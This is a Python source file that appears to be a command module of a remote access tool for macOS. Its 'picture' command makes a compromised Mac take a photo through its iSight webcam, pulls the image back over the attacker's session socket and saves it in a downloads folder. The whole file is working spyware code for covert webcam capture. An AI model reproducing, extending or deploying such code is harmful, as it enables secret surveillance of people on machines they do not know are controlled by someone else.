import json, time, binascii, os
import modules.helper as h

class command:
    def __init__(self):
        self.name = "picture"
        self.description = "take picture through iSight"
        self.type = "native"

    def run(self,session,cmd_data):
		h.info_general("Taking picture...")
		response = json.loads(session.send_command(cmd_data))
		try:
			success = response["status"]
			if success == 1:
				size = int(response["size"])
				file_name = "isight_{0}.jpg".format(int(time.time()))
				data = session.sock_receive_data(size)
				h.info_general("Saving {0}".format(file_name))
				# save to file
				f = open(os.path.join('downloads',file_name),'w')
				f.write(data)
				f.close()
				h.info_general("Saved to ./downloads/{0}".format(file_name))
		except Exception as e:
			print e

